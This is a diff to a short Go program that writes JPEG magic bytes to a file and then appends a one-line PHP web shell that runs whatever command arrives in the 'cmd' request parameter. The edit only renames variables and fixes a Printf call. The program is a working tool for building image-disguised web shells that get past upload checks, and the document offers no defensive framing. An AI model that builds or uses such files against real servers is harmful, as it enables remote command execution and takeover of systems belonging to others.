@@ -12,19 +12,19 @@ func main() {
 	}
 	defer f.Close()
 
-	//  ff d8 ff db 00 00 00 00
-	d2 := []byte{255, 216, 255, 219, 00, 00, 00, 00}
-	n2, err := f.Write(d2)
+	// jpg - ff d8 ff db 00 00 00 00
+	jpgMagicBytes := []byte{255, 216, 255, 219, 00, 00, 00, 00}
+	bytesWritten, err := f.Write(jpgMagicBytes)
 	if err != nil {
 		panic(err)
 	}
-	fmt.Printf("wrote magic %d bytes\n", n2)
+	fmt.Printf("wrote magic %d bytes\n", bytesWritten)
 
-	n3, err := f.WriteString("<?php echo system($_REQUEST['cmd']); ?>\n")
+	stringBytesWritten, err := f.WriteString("<?php echo system($_REQUEST['cmd']); ?>\n")
 	if err != nil {
 		panic(err)
 	}
-	fmt.Printf("appended actual script content\n", n3)
+	fmt.Printf("appended actual script content - %d bytes\n", stringBytesWritten)
 
 	f.Sync()
 }
